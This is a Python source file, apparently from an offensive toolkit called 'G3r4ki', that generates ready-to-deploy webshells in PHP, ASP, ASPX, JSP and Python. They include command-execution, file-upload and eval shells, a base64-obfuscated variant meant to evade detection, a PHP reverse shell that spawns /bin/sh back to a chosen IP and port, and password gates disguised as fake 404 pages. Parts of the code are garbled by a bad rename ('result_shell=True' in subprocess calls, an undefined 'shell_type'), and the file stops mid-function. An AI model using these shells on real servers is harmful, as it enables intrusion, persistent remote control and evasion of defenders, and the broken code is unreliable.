"""
G3r4ki Webshells Module

This module provides webshell generation capabilities for various languages.
"""

import base64
import logging
import os
from typing import Dict, List, Optional, Union, Any

# Setup logging
logger = logging.getLogger("g3r4ki.exploitation.payloads.webshells")

class WebshellGenerator:
    """
    Webshell Generator class
    
    This class provides methods to generate various types of webshells.
    """
    
    def __init__(self):
        """Initialize the webshell generator"""
        self.available_shells = {
            "php": {
                "basic": "Basic PHP shell with command execution",
                "mini": "Minimal one-liner PHP shell",
                "uploader": "PHP shell with file upload capability",
                "eval": "PHP eval shell for direct code execution",
                "obfuscated": "Obfuscated PHP shell to evade detection",
                "reverse": "PHP reverse shell with callback functionality"
            },
            "asp": {
                "basic": "Basic ASP shell with command execution",
                "mini": "Minimal one-liner ASP shell",
                "obfuscated": "Obfuscated ASP shell to evade detection"
            },
            "aspx": {
                "basic": "Basic ASPX shell with command execution",
                "uploader": "ASPX shell with file upload capability"
            }
        }
        
        # Create a copy for result_shells to maintain consistency
        self.available_result_shells = {
            "jsp": {
                "basic": "Basic JSP shell with command execution",
                "uploader": "JSP shell with file upload capability"
            },
            "python": {
                "basic": "Basic Python shell with command execution",
                "advanced": "Advanced Python shell with extended capabilities",
                "flask": "Python Flask-based web shell"
            }
        }
    
    def get_available_shells(self) -> Dict[str, Dict[str, str]]:
        """
        Get available shell types
        
        Returns:
            Dictionary mapping shell types to variants
        """
        return self.available_shells
    
    def generate_php_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate PHP webshell
        
        Args:
            variant: Shell variant
            password: Optional password for protected shells
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If variant is unknown
        """
        result_shell = ""
        if variant not in self.available_shells["php"]:
            variant = "basic"
            logger.warning(f"Unknown PHP shell variant, using {variant}")
        
        if variant == "basic":
            result_shell = """<?php
    // G3r4ki PHP Webshell
    if(isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>
<html>
<head>
    <title>G3r4ki PHP Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h1>G3r4ki PHP Shell</h1>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    <hr>
    <h3>System Information</h3>
    <pre><?php system('uname -a'); ?></pre>
    <pre><?php system('id'); ?></pre>
    <pre>Current Directory: <?php echo getcwd(); ?></pre>
</body>
</html>"""
            
        elif variant == "mini":
            result_shell = """<?php echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; ?>"""
            
        elif variant == "uploader":
            result_shell = """<?php
    // G3r4ki PHP Upload Shell
    if(isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
    }
    
    if(isset($_FILES['upload'])) {
        $filename = $_FILES['upload']['name'];
        $uploaddir = './';
        $uploadfile = $uploaddir . basename($filename);
        
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
            echo "<p>File uploaded successfully to $uploadfile</p>";
        } else {
            echo "<p>Upload failed!</p>";
        }
    }
?>
<html>
<head>
    <title>G3r4ki PHP Upload Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1, h2 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h1>G3r4ki PHP Upload Shell</h1>
    <h2>Command Execution</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    
    <h2>File Upload</h2>
    <form enctype="multipart/form-data" method="POST">
        <input type="file" name="upload">
        <input type="submit" value="Upload">
    </form>
    
    <hr>
    <h3>System Information</h3>
    <pre><?php system('uname -a'); ?></pre>
    <pre><?php system('id'); ?></pre>
    <pre>Current Directory: <?php echo getcwd(); ?></pre>
</body>
</html>"""
            
        elif variant == "eval":
            result_shell = """<?php
    // G3r4ki PHP Eval Shell
    if(isset($_REQUEST['code'])) {
        echo "<pre>";
        eval($_REQUEST['code']);
        echo "</pre>";
    }
?>
<html>
<head>
    <title>G3r4ki PHP Eval Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        textarea { width: 100%; height: 150px; padding: 8px; margin-bottom: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h1>G3r4ki PHP Eval Shell</h1>
    <form method="POST">
        <textarea name="code" placeholder="Enter PHP code to execute..."><?php if(isset($_REQUEST['code'])) echo htmlspecialchars($_REQUEST['code']); ?></textarea>
        <input type="submit" value="Execute">
    </form>
    <hr>
    <h3>System Information</h3>
    <pre><?php echo "PHP Version: " . phpversion(); ?></pre>
    <pre><?php system('uname -a'); ?></pre>
    <pre><?php system('id'); ?></pre>
</body>
</html>"""
            
        elif variant == "obfuscated":
            # Simple base64 obfuscation
            basic_shell = "<?php if(isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); } ?>"
            encoded = base64.b64encode(basic_shell.encode()).decode()
            result_shell = f"<?php eval(base64_decode('{encoded}')); ?>"
            
        elif variant == "reverse":
            result_shell = """<?php
    // G3r4ki PHP Reverse Shell
    // Set these values
    $ip = '127.0.0.1';  // Change to your IP
    $port = 4444;       // Change to your listening port
    
    // Don't modify below this line
    if(isset($_REQUEST['connect'])) {
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            echo "$errstr ($errno)<br>\\n";
            exit(1);
        }
        
        $descriptorspec = array(
           0 => array("pipe", "r"),
           1 => array("pipe", "w"),
           2 => array("pipe", "w")
        );
        
        $process = proc_open("/bin/sh -i", $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            while (!feof($sock)) {
                $cmd = fread($sock, 1024);
                fwrite($pipes[0], $cmd);
                
                $output = fread($pipes[1], 1024);
                fwrite($sock, $output);
                
                $error = fread($pipes[2], 1024);
                fwrite($sock, $error);
            }
            
            proc_close($process);
        }
        
        fclose($sock);
        echo "Connection closed.";
        exit;
    }
?>
<html>
<head>
    <title>G3r4ki Reverse Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=submit] { padding: 8px 15px; background-color: #d9534f; color: white; border: none; }
    </style>
</head>
<body>
    <h1>G3r4ki PHP Reverse Shell</h1>
    <p>Target: <?php echo $ip; ?>:<?php echo $port; ?></p>
    <form method="POST">
        <input type="hidden" name="connect" value="1">
        <input type="submit" value="Connect">
    </form>
    <p><strong>Note:</strong> Make sure you have a listener running with: <code>nc -lvnp <?php echo $port; ?></code></p>
</body>
</html>"""
            
            # Customize with provided IP and port
            if password:
                # If password is provided, use it as the IP address (hacky way to pass IP)
                try:
                    ip_parts = password.split(':')
                    if len(ip_parts) == 2:
                        ip, port = ip_parts
                        result_shell = result_shell.replace("$ip = '127.0.0.1';", f"$ip = '{ip}';")
                        result_shell = result_shell.replace("$port = 4444;", f"$port = {port};")
                except:
                    pass
        
        # Add password protection if requested
        if password and variant not in ["obfuscated", "reverse"]:
            passwd_check = f"""<?php
if (!isset($_REQUEST['p']) || $_REQUEST['p'] !== '{password}') {{
    http_response_code(404);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}}
?>
"""
            # Insert password check at the beginning (after initial PHP tag)
            result_shell = result_shell.replace("<?php", "<?php\n" + passwd_check, 1)
        
        return result_shell
    
    def generate_asp_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate ASP webshell
        
        Args:
            variant: Shell variant
            password: Optional password for protected shells
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If variant is unknown
        """
        result_shell = ""
        if variant not in self.available_shells["asp"]:
            variant = "basic"
            logger.warning(f"Unknown ASP shell variant, using {variant}")
        
        if variant == "basic":
            result_shell = """<%
' G3r4ki ASP Webshell
If Request.Form("cmd") <> "" Then
    Dim oScript
    Dim oScriptNet
    Dim oFileSys, oFile
    Dim szCMD, szTempFile
    
    szCMD = Request.Form("cmd")
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
    
    szTempFile = "cmd.txt"
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
    
    Response.Write "<pre>"
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    Response.Write "</pre>"
    
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
End If
%>

<html>
<head>
    <title>G3r4ki ASP Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h1>G3r4ki ASP Shell</h1>
    <form method="POST">
        <input type="text" name="cmd" value="<%= Request.Form("cmd") %>" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    <hr>
    <h3>System Information</h3>
    <pre>Server: <%= Request.ServerVariables("SERVER_SOFTWARE") %></pre>
    <pre>Server Name: <%= Request.ServerVariables("SERVER_NAME") %></pre>
    <pre>Current Path: <%= Server.MapPath(".") %></pre>
</body>
</html>"""
            
        elif variant == "mini":
            result_shell = """<% Set s=Server.CreateObject("WSCRIPT.SHELL"):Set c=s.Exec("cmd.exe /c " & Request.Form("cmd")):Response.Write("<pre>" & c.StdOut.ReadAll & "</pre>") %>
<form method="POST"><input name="cmd" value="<%=Request.Form("cmd")%>"><input type="submit"></form>"""
            
        elif variant == "obfuscated":
            result_shell = """<%
Dim oS,oE,sc,oc,S1,S2,S3,S4
S1 = "Exec"
S2 = "WSCRIPT.SHELL"
S3 = "cmd.exe /c "
S4 = Request("c")
Set oS = Server.CreateObject(S2)
Set oE = oS.Exec(S3 & S4)
sc = oE.StdOut.ReadAll()
oc = oE.StdErr.ReadAll()
Response.write("<pre>" & sc & oc & "</pre>")
%>
<form method="POST">
<input type="text" name="c">
<input type="submit" value="Run">
</form>"""
        
        # Add password protection if requested
        if password:
            passwd_check = f"""<%
If Request.Form("p") <> "{password}" Then
    Response.Status = "404 Not Found"
    Response.Write("<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>")
    Response.End
End If
%>
"""
            result_shell = passwd_check + result_shell
        
        return result_shell
    
    def generate_aspx_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate ASPX webshell
        
        Args:
            variant: Shell variant
            password: Optional password for protected shells
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If variant is unknown
        """
        if variant not in self.available_shells["aspx"]:
            variant = "basic"
            logger.warning(f"Unknown ASPX shell variant, using {variant}")
        
        result_shell = ""
        if variant == "basic":
            result_shell = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            // Display system info
            lblSystemInfo.Text = "Server: " + Request.ServerVariables["SERVER_SOFTWARE"] + "<br>";
            lblSystemInfo.Text += "OS Version: " + Environment.OSVersion + "<br>";
            lblSystemInfo.Text += "Current User: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "<br>";
            lblSystemInfo.Text += "Current Path: " + Server.MapPath(".") + "<br>";
        }
    }
    
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        string cmd = txtCommand.Text.Trim();
        if (string.IsNullOrEmpty(cmd))
            return;
            
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            
            Process p = Process.Start(psi);
            StreamReader outputReader = p.StandardOutput;
            StreamReader errorReader = p.StandardError;
            
            string output = outputReader.ReadToEnd();
            string error = errorReader.ReadToEnd();
            
            p.WaitForExit();
            
            lblOutput.Text = Server.HtmlEncode(output + error);
        }
        catch (Exception ex)
        {
            lblOutput.Text = "Error: " + Server.HtmlEncode(ex.Message);
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>G3r4ki ASPX Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <h1>G3r4ki ASPX Shell</h1>
        <div>
            <asp:TextBox ID="txtCommand" runat="server" Width="70%" placeholder="Enter command..."></asp:TextBox>
            <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
        </div>
        <hr />
        <h3>Command Output</h3>
        <pre><asp:Label ID="lblOutput" runat="server"></asp:Label></pre>
        <hr />
        <h3>System Information</h3>
        <pre><asp:Label ID="lblSystemInfo" runat="server"></asp:Label></pre>
    </form>
</body>
</html>"""
            
        elif variant == "uploader":
            result_shell = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            // Display system info
            lblSystemInfo.Text = "Server: " + Request.ServerVariables["SERVER_SOFTWARE"] + "<br>";
            lblSystemInfo.Text += "OS Version: " + Environment.OSVersion + "<br>";
            lblSystemInfo.Text += "Current User: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "<br>";
            lblSystemInfo.Text += "Current Path: " + Server.MapPath(".") + "<br>";
        }
    }
    
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        string cmd = txtCommand.Text.Trim();
        if (string.IsNullOrEmpty(cmd))
            return;
            
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            
            Process p = Process.Start(psi);
            StreamReader outputReader = p.StandardOutput;
            StreamReader errorReader = p.StandardError;
            
            string output = outputReader.ReadToEnd();
            string error = errorReader.ReadToEnd();
            
            p.WaitForExit();
            
            lblOutput.Text = Server.HtmlEncode(output + error);
        }
        catch (Exception ex)
        {
            lblOutput.Text = "Error: " + Server.HtmlEncode(ex.Message);
        }
    }
    
    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (fileUpload.HasFile)
        {
            try
            {
                string fileName = Path.GetFileName(fileUpload.FileName);
                string savePath = Server.MapPath(".") + "\\" + fileName;
                fileUpload.SaveAs(savePath);
                lblUploadStatus.Text = "File uploaded successfully to: " + savePath;
            }
            catch (Exception ex)
            {
                lblUploadStatus.Text = "Error uploading file: " + ex.Message;
            }
        }
        else
        {
            lblUploadStatus.Text = "Please select a file to upload.";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>G3r4ki ASPX Upload Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1, h2 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
        .upload-section { margin-top: 20px; background-color: #fff; padding: 15px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <h1>G3r4ki ASPX Upload Shell</h1>
        
        <h2>Command Execution</h2>
        <div>
            <asp:TextBox ID="txtCommand" runat="server" Width="70%" placeholder="Enter command..."></asp:TextBox>
            <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
        </div>
        <pre><asp:Label ID="lblOutput" runat="server"></asp:Label></pre>
        
        <h2>File Upload</h2>
        <div class="upload-section">
            <asp:FileUpload ID="fileUpload" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
            <p><asp:Label ID="lblUploadStatus" runat="server"></asp:Label></p>
        </div>
        
        <hr />
        <h3>System Information</h3>
        <pre><asp:Label ID="lblSystemInfo" runat="server"></asp:Label></pre>
    </form>
</body>
</html>"""
        
        # Add password protection if requested
        if password:
            passwd_check = f"""<%@ Page Language="C#" %>
<%
    if (Request.Form["p"] != "{password}")
    {{
        Response.StatusCode = 404;
        Response.Write("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
        Response.End();
    }}
%>
"""
            # Replace the ASPX page directive with our password-protected one
            result_shell = result_shell.replace("<%@ Page Language=\"C#\" %>", passwd_check)
        
        return result_shell
    
    def generate_jsp_result_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate JSP webresult_shell
        
        Args:
            variant: Shell variant
            password: Optional password for protected result_shells
            
        Returns:
            Webresult_shell code
            
        Raises:
            ValueError: If variant is unknown
        """
        if variant not in self.available_result_shells["jsp"]:
            variant = "basic"
            logger.warning(f"Unknown JSP result_shell variant, using {variant}")
        
        if variant == "basic":
            result_shell = """<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.net.*" %>

<html>
<head>
    <title>G3r4ki JSP Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki JSP Shell</h1>
    <form method="post">
        <input type="text" name="cmd" value="<%= (request.getParameter("cmd") != null) ? request.getParameter("cmd") : "" %>" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    <h3>Command Output</h3>
    <pre>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream is = p.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            
            br.close();
            
            // Also capture error output
            is = p.getErrorStream();
            br = new BufferedReader(new InputStreamReader(is));
            
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            
            br.close();
        } catch (Exception e) {
            out.println("Error executing command: " + e.getMessage());
        }
    }
%>
    </pre>
    
    <hr>
    <h3>System Information</h3>
    <pre>
    OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
    Java Version: <%= System.getProperty("java.version") %>
    User: <%= System.getProperty("user.name") %>
    Current Directory: <%= new File(".").getAbsolutePath() %>
    </pre>
</body>
</html>"""
            
        elif variant == "uploader":
            result_shell = """<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>

<%
String uploadStatus = "";
String cmdOutput = "";

// Execute command if present
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream is = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line;
        StringBuilder output = new StringBuilder();
        
        while ((line = br.readLine()) != null) {
            output.append(line).append("\\n");
        }
        
        br.close();
        
        // Also capture error output
        is = p.getErrorStream();
        br = new BufferedReader(new InputStreamReader(is));
        
        while ((line = br.readLine()) != null) {
            output.append(line).append("\\n");
        }
        
        br.close();
        cmdOutput = output.toString();
    } catch (Exception e) {
        cmdOutput = "Error executing command: " + e.getMessage();
    }
}

// Handle file upload if multipart
boolean isMultipart = ServletFileUpload.isMultipartContent(request);
if (isMultipart) {
    try {
        DiskFileItemFactory factory = new DiskFileItemFactory();
        factory.setSizeThreshold(1024 * 1024);
        factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
        
        ServletFileUpload upload = new ServletFileUpload(factory);
        upload.setSizeMax(10 * 1024 * 1024); // 10MB max
        
        List<FileItem> items = upload.parseRequest(request);
        
        for (FileItem item : items) {
            if (!item.isFormField()) {
                String fileName = new File(item.getName()).getName();
                String filePath = getServletContext().getRealPath("/") + fileName;
                File uploadedFile = new File(filePath);
                item.write(uploadedFile);
                uploadStatus = "File uploaded successfully to: " + filePath;
            }
        }
    } catch (Exception e) {
        uploadStatus = "Error uploading file: " + e.getMessage();
    }
}
%>

<html>
<head>
    <title>G3r4ki JSP Upload Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1, h2 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
        .upload-section { margin-top: 20px; background-color: #fff; padding: 15px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki JSP Upload Shell</h1>
    
    <h2>Command Execution</h2>
    <form method="post">
        <input type="text" name="cmd" value="<%= (request.getParameter("cmd") != null) ? request.getParameter("cmd") : "" %>" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    
    <% if (!cmdOutput.isEmpty()) { %>
    <pre><%= cmdOutput %></pre>
    <% } %>
    
    <h2>File Upload</h2>
    <div class="upload-section">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
        <% if (!uploadStatus.isEmpty()) { %>
        <p><%= uploadStatus %></p>
        <% } %>
    </div>
    
    <hr>
    <h3>System Information</h3>
    <pre>
    OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
    Java Version: <%= System.getProperty("java.version") %>
    User: <%= System.getProperty("user.name") %>
    Current Directory: <%= new File(".").getAbsolutePath() %>
    </pre>
</body>
</html>"""
        
        # Add password protection if requested
        if password:
            passwd_check = f"""<%
    if (request.getParameter("p") == null || !request.getParameter("p").equals("{password}")) {{
        response.setStatus(404);
        out.println("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
        return;
    }}
%>
"""
            # Insert password check at the beginning (after imports)
            if "<%@" in result_shell:
                last_import_index = result_shell.rfind("<%@ page")
                last_import_end = result_shell.find("%>", last_import_index) + 2
                result_shell = result_shell[:last_import_end] + "\n" + passwd_check + result_shell[last_import_end:]
            else:
                result_shell = passwd_check + result_shell
        
        return result_shell
    
    def generate_python_result_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate Python webresult_shell
        
        Args:
            variant: Shell variant
            password: Optional password for protected result_shells
            
        Returns:
            Webresult_shell code
            
        Raises:
            ValueError: If variant is unknown
        """
        if variant not in self.available_result_shells["python"]:
            variant = "basic"
            logger.warning(f"Unknown Python result_shell variant, using {variant}")
        
        if variant == "basic":
            result_shell = """#!/usr/bin/env python3
import cgi
import cgitb
import os
import subprocess
import sys
import platform

# Enable CGI error reporting for debugging
cgitb.enable()

print("Content-Type: text/html\\n")

html_top = '''<!DOCTYPE html>
<html>
<head>
    <title>G3r4ki Python Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki Python Shell</h1>
'''

html_bottom = '''
</body>
</html>'''

form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "")

print(html_top)
print(f'''
<form method="post">
    <input type="text" name="cmd" value="{cmd}" placeholder="Enter command..." autofocus>
    <input type="submit" value="Execute">
</form>
''')

if cmd:
    print("<hr>")
    print("<h3>Command Output</h3>")
    print("<pre>")
    try:
        output = subprocess.check_output(cmd, result_shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed with return code {e.returncode}\\n")
        print(e.output)
    except Exception as e:
        print(f"Error: {str(e)}")
    print("</pre>")

print("<hr>")
print("<h3>System Information</h3>")
print("<pre>")
print(f"Python Version: {sys.version}")
print(f"OS: {platform.platform()}")
print(f"Current User: {os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown')}")
print(f"Current Working Directory: {os.getcwd()}")
print("</pre>")

print(html_bottom)
"""
            
        elif variant == "flask":
            result_shell = """#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect, url_for
import subprocess
import os
import platform
import sys

app = Flask(__name__)

HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <title>G3r4ki Flask Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
        .upload-section { margin-top: 20px; background-color: #fff; padding: 15px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki Flask Shell</h1>
    
    <form method="post" action="/">
        <input type="text" name="cmd" value="{{ cmd }}" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    
    {% if output %}
    <hr>
    <h3>Command Output</h3>
    <pre>{{ output }}</pre>
    {% endif %}
    
    <hr>
    <h3>System Information</h3>
    <pre>
Python Version: {{ python_version }}
OS: {{ platform }}
Current User: {{ user }}
Current Working Directory: {{ cwd }}
    </pre>
</body>
</html>'''

@app.route('/', methods=['GET', 'POST'])
def index():
    output = ""
    cmd = ""
    
    if request.method == 'POST':
        cmd = request.form.get('cmd', '')
        if cmd:
            try:
                process = subprocess.Popen(
                    cmd, 
                    result_shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                stdout, stderr = process.communicate()
                output = stdout + stderr
            except Exception as e:
                output = f"Error: {str(e)}"
    
    return render_template_string(
        HTML_TEMPLATE,
        cmd=cmd,
        output=output,
        python_version=sys.version,
        platform=platform.platform(),
        user=os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown'),
        cwd=os.getcwd()
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
"""
        
        # Add password protection if requested
        if password:
            if variant == "basic":
                passwd_check = f"""
# Password protection
form = cgi.FieldStorage()
if form.getvalue("p") != "{password}":
    print("Status: 404 Not Found")
    print("Content-Type: text/html\\n")
    print("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>")
    sys.exit(0)

"""
                # Insert password check after imports
                insert_pos = result_shell.find("# Enable CGI error reporting for debugging")
                result_shell = result_shell[:insert_pos] + passwd_check + result_shell[insert_pos:]
            elif variant == "flask":
                passwd_check = f"""
@app.before_request
def check_password():
    if request.endpoint != 'static':
        if request.args.get('p') != "{password}":
            return "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>", 404

"""
                # Insert password check before the route
                insert_pos = result_shell.find("@app.route")
                result_shell = result_shell[:insert_pos] + passwd_check + result_shell[insert_pos:]
        
        return result_shell
    
    def generate_result_shell(self, result_shell_type: str, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate a webresult_shell
        
        Args:
            shell_type: Shell language (php, asp, aspx, jsp, python)
            variant: Shell variant
            password: Optional password for protection
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If shell type is unknown
        """
        if shell_type == "php":
            return self.generate_php_shell(variant, password)
        elif shell_type == "asp":
            return self.generate_asp_shell(variant, password)
        elif shell_type == "aspx":
            return self.generate_aspx_shell(variant, password)
        elif shell_type == "jsp":
            return self.generate_jsp_result_shell(variant, password)
        elif shell_type == "python":
            return self.generate_python_result_shell(variant, password)
        else:
